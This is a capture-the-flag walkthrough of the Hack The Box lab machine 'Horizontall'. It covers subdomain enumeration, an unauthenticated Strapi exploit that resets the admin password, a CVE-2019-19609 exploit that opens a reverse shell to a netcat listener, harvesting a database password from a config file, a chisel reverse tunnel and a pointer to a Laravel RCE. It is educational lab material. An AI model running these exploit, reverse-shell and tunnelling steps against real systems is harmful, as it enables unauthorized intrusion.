# Walkthrough HTB --> Horizontall

![Alt text](./HTB_HORIZONTALL/horizontall_card.png?raw=true "Card")

We use nmap to scan the target machine with the command:

```bash
──(root💀animale)-[/home/animale]
└─# nmap -sV -sC 10.10.11.105
Starting Nmap 7.92 ( https://nmap.org ) at 2022-01-18 06:14 IST
Nmap scan report for horizontall.htb (10.10.11.105)
Host is up (0.095s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 ee:77:41:43:d4:82:bd:3e:6e:6e:50:cd:ff:6b:0d:d5 (RSA)
|   256 3a:d5:89:d5:da:95:59:d9:df:01:68:37:ca:d5:10:b0 (ECDSA)
|_  256 4a:00:04:b4:9d:29:e7:af:37:16:1b:4f:80:2d:98:94 (ED25519)
80/tcp open  http    nginx 1.14.0 (Ubuntu)
|_http-title: horizontall
|_http-server-header: nginx/1.14.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.39 seconds
```

We can see that port 80 and 22 are open.

I then added the ip to my **/etc/hosts** with the following command:

```bash
echo "10.10.11.105 horizontall.htb" >> /etc/hosts

```

As usual we run **gobuster** to scan our target website.

In the meantime, let's have a look into the web page:

![Alt text](./HTB_HORIZONTALL/web_page.png "Horizontall.htb")


The result doesn't show anything interesting.

```bash
┌──(root💀animale)-[/home/animale]
└─# gobuster dir -u http://horizontall.htb/  -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -t 100                                                                                                                       1 ⨯
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://horizontall.htb/
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/01/18 06:15:33 Starting gobuster in directory enumeration mode
===============================================================
/img                  (Status: 301) [Size: 194] [--> http://horizontall.htb/img/]
/css                  (Status: 301) [Size: 194] [--> http://horizontall.htb/css/]
/js                   (Status: 301) [Size: 194] [--> http://horizontall.htb/js/] 
Progress: 6964 / 220561 (3.16%)                                                 ^C
[!] Keyboard interrupt detected, terminating.
                                                                                 
===============================================================
2022/01/18 06:15:40 Finished
===============================================================

```

I then used **wfuzz** to do a subdomain enumeration and after some time, something interesting came out:

```bash
┌──(root💀animale)-[/home/animale]
└─# wfuzz -w Tools/Subdomain.txt -u http://horizontall.htb --hc 301,400 -c -H "Host:FUZZ.horizontall.htb"             
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://horizontall.htb/
Total requests: 649649

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                                                                      
=====================================================================

000000003:   200        1 L      43 W       901 Ch   "www"                                                                                                                                                                        
000019888:   200        1 L      43 W       901 Ch      "www"                                                                                                                                                                        
000032451:   200        19 L     33 W       413 Ch      "api-prod"                                                                                                                                                                   


^C /usr/lib/python3/dist-packages/wfuzz/wfuzz.py:80: UserWarning:Finishing pending requests...

Total time: 1045.325
Processed Requests: 89745
Filtered Requests: 89742
Requests/sec.: 85.85366

```

#### GREAT NEWS!! 

Let's add it to the /etc/hosts:

```bash
┌──(root💀animale)-[/home/animale]
└─# echo "10.10.11.105 api-prod.horizontall.htb" >> /etc/hosts  
```

Now it's time for another scan with **gobuster**:

```bash
┌──(root💀animale)-[/home/animale]
└─# gobuster dir -u http://api-prod.horizontall.htb/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x txt, php -e -t 50
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://api-prod.horizontall.htb/
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              txt,
[+] Expanded:                true
[+] Timeout:                 10s
===============================================================
2022/01/18 07:16:01 Starting gobuster in directory enumeration mode
===============================================================
http://api-prod.horizontall.htb/reviews              (Status: 200) [Size: 507]
http://api-prod.horizontall.htb/users                (Status: 403) [Size: 60] 
http://api-prod.horizontall.htb/admin                (Status: 200) [Size: 854]
http://api-prod.horizontall.htb/Reviews              (Status: 200) [Size: 507]
http://api-prod.horizontall.htb/robots.txt           (Status: 200) [Size: 121]
http://api-prod.horizontall.htb/Users                (Status: 403) [Size: 60] 
http://api-prod.horizontall.htb/Admin                (Status: 200) [Size: 854]
http://api-prod.horizontall.htb/REVIEWS              (Status: 200) [Size: 507]
http://api-prod.horizontall.htb/%C0                  (Status: 400) [Size: 69] 
http://api-prod.horizontall.htb/%C0.txt              (Status: 400) [Size: 69] 
http://api-prod.horizontall.htb/%C0.                 (Status: 400) [Size: 69] 
                                                                              
===============================================================
2022/01/18 07:26:58 Finished
===============================================================
```

I've checked the robots.txt, but it was empty, so I went to the admin link:

![Alt text](./HTB_HORIZONTALL/admin.png "Horizontall.htb")

I've done some googleing and find out that Strapi CMS has a RCE on version 3.0.0-beta, so let's see if my kali has the exploit.

```bash
┌──(root💀animale)-[/home/animale]
└─# searchsploit strapi                                                                                                                                                                                                                 130 ⨯
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                                                                                                                                              |  Path
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
Strapi 3.0.0-beta - Set Password (Unauthenticated)                                                                                                                                                          | multiple/webapps/50237.py
Strapi 3.0.0-beta.17.7 - Remote Code Execution (RCE) (Authenticated)                                                                                                                                        | multiple/webapps/50238.py
Strapi CMS 3.0.0-beta.17.4 - Remote Code Execution (RCE) (Unauthenticated)                                                                                                                                  | multiple/webapps/50239.py
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
Shellcodes: No Results

```

There are 3 exploit, let's try the 3rd:

```bash
┌──(root💀animale)-[/home/animale]
└─# python3 /home/share/exploitdb/exploits/multiple/webapps/50239.py http://api-prod.horizontall.htb                                                                                                                                    130 ⨯
[+] Checking Strapi CMS Version running
[+] Seems like the exploit will work!!!
[+] Executing exploit


[+] Password reset was successfully
[+] Your email is: admin@horizontall.htb
[+] Your new credentials are: admin:SuperStrongPassword1
[+] Your authenticated JSON Web Token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MywiaXNBZG1pbiI6dHJ1ZSwiaWF0IjoxNjQyNDg1MTkwLCJleHAiOjE2NDUwNzcxOTB9.HWAsMquwcicCk7uvEgYNIX0fu7C_RykIj0WQkzoN9oY


$>
```
#### GREAT, THE EXPLOIT WORKS!!!!

Let's use the credentials to login as admin!

![Alt text](./HTB_HORIZONTALL/admin_access.png "Horizontall.htb")

Continuing my researches on google, I found an additional exploit (https://github.com/diego-tella/CVE-2019-19609-EXPLOIT) which need the info retrieved from the one before.

I then runned it, opening a listner in another terminal beforehands.

```bash
                                                                                                                                                                                                                                             
┌──(animale㉿animale)-[~/Tools/CVE-2019-19609-EXPLOIT]
└─$ python3 exploit.py -d api-prod.horizontall.htb -jwt  eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MywiaXNBZG1pbiI6dHJ1ZSwiaWF0IjoxNjQyNDg1MTkwLCJleHAiOjE2NDUwNzcxOTB9.HWAsMquwcicCk7uvEgYNIX0fu7C_RykIj0WQkzoN9oY -l 10.10.14.57 -p 4444
[+] Exploit for Remote Code Execution for strapi-3.0.0-beta.17.7 and earlier (CVE-2019-19609)
[+] Remember to start listening to the port 4444 to get a reverse shell
[+] Sending payload... Check if you got shell
[+] Payload sent. Response:
<Response [504]>
<html>
<head><title>504 Gateway Time-out</title></head>
<body bgcolor="white">
<center><h1>504 Gateway Time-out</h1></center>
<hr><center>nginx/1.14.0 (Ubuntu)</center>
</body>
</html>

```

And in the listner terminal I got a remote shell:

```bash                                                                
┌──(animale㉿animale)-[~/Desktop/Walkthoughts]
└─$ nc -lvp 4444           
Listening on 0.0.0.0 4444
Connection received on horizontall.htb 34528
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=1001(strapi) gid=1001(strapi) groups=1001(strapi)
$ 


```
#### We're in!!!!!

I found that in /home there is a developer user folder and inside there is the first flag, which is readable from all.

```bash
strapi@horizontall:~/myapi$ cd /home
strapi@horizontall:/home$ cat develop	user	
cat developer/user.txt 
2******************************b
```

### Privileges escalation

I uploaded and launched **linpeas** to see if any missconfiguration or some secret were stated in the system and i found something interesting:

```bash
╔══════════╣ Active Ports
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#open-ports
tcp        0      0 127.0.0.1:8000          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:1337          0.0.0.0:*               LISTEN      1858/node /usr/bin/ 
tcp6       0      0 :::80                   :::*                    LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   

------------------------------------------------------------------------------------------------------

-rw-rw-r-- 1 strapi strapi 351 May 26  2021 /opt/strapi/myapi/config/environments/development/database.json
{
  "defaultConnection": "default",
  "connections": {
    "default": {
      "connector": "strapi-hook-bookshelf",
      "settings": {
        "client": "mysql",
        "database": "strapi",
        "host": "127.0.0.1",
        "port": 3306,
        "username": "developer",
        "password": "#J!:F9Zt2u"
      },
      "options": {}
    }
  }
}

```

Let's try to run ssh into the developer user:

```bash
┌──(animale㉿animale)-[~/Desktop/Walkthoughts]
└─$ ssh developer@horizontall.htb
The authenticity of host 'horizontall.htb (10.10.11.105)' can't be established.
ED25519 key fingerprint is SHA256:Xe1jfjgC2NgH1uDUUr14erdojTBy+zenI7KtOwu8+ZY.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'horizontall.htb' (ED25519) to the list of known hosts.
developer@horizontall.htb's password: 
Permission denied, please try again.
developer@horizontall.htb's password: 
Permission denied, please try again.
developer@horizontall.htb's password: 
developer@horizontall.htb: Permission denied (publickey,password).
```

My idea was to do a port forwarding for the port 8000 as it usually represent a web app, but it seems that we can't do any port forwarding unless we discover the password of our current user.

After some research, I found **chisel** (https://github.com/jpillora/chisel) a server client sw which allow the port forwarding.

Let's try it!

On my kali machine I used:

```bash
┌──(root💀animale)-[/home/animale]
└─# chisel server -p 8081 --reverse
2022/01/18 09:01:19 server: Reverse tunnelling enabled
2022/01/18 09:01:19 server: Fingerprint Vj5pu4iMQo3kRjFqBeVXxOB/MFF9FPIAGVQhYvaZrdM=
2022/01/18 09:01:19 server: Listening on http://0.0.0.0:8081
2022/01/18 09:01:59 server: session#1: tun: proxy#R:8001=>8000: Listening

```
while on the victim:

```bash
strapi@horizontall:~$ ./chisel_1.7.6_linux_386 client http://10.10.14.57:8081 R:8001:127.0.0.1:8000
<lient http://10.10.14.57:8081 R:8001:127.0.0.1:8000
2022/01/18 07:02:00 client: Connecting to ws://10.10.14.57:8081
2022/01/18 07:02:01 client: Connected (Latency 95.004661ms)

```

Now let's ope our browser to the localhost:8001

![Alt text](./HTB_HORIZONTALL/laravel.png "Horizontall.htb")

Another WebApp as expected!!!!

It didn't take long searching on google, and we find that lavarel has a RCE and related exploit (https://github.com/nth347/CVE-2021-3129_exploit).

We can then execute the commands and retrieve the root flag.

Enjoy!!!!
